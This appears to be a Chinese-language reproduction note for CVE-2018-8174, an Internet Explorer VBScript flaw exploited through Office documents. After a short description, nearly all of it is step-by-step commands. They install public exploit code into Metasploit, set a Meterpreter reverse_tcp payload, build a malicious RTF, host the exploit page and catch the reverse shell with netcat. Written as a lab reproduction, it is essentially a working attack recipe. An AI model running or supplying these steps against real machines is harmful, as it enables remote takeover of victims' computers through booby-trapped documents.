## CVE-2018-8174
全球首例利用浏览器0day漏洞的新型Office文档攻击,该漏洞影响最新版本的IE浏览器及使用了IE内核的应用程序。用户在浏览网页或打开Office文档时都可能中招，最终被黑客植入后门木马完全控制电脑。微软在4月20日早上确认此漏洞，并于5月8号发布了官方安全补丁，对该0day漏洞进行了修复，并将其命名为CVE-2018-8174。

## 复现
使用参考1的exp，它只支持32位:
下载exp:
```
git clone https://github.com/0x09AL/CVE-2018-8174-msf.git
cp CVE-2018-8174.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat/
cp CVE-2018-8174.rtf /usr/share/metasploit-framework/data/exploits/
```
启动msf:
```
msfconsole
use exploit/windows/fileformat/CVE-2018-8174
set PAYLOAD windows/meterpreter/reverse_tcp
set srvhost 192.168.0.116
set lhost 192.168.0.116
exploit
```
使用参考2的，支持所有：
```
git clone https://github.com/Yt1g3r/CVE-2018-8174_EXP.git
cd CVE-2018-8174_EXP
python CVE-2018-8174.py -u http://1.1.1.1/exploit.html -o exp.rtf -i 2.2.2.2 -p 4444
python -m SimpleHTTPServer 6666
nc -lp 4444
```
## 参考
1. https://github.com/0x09AL/CVE-2018-8174-msf
2. https://github.com/Yt1g3r/CVE-2018-8174_EXP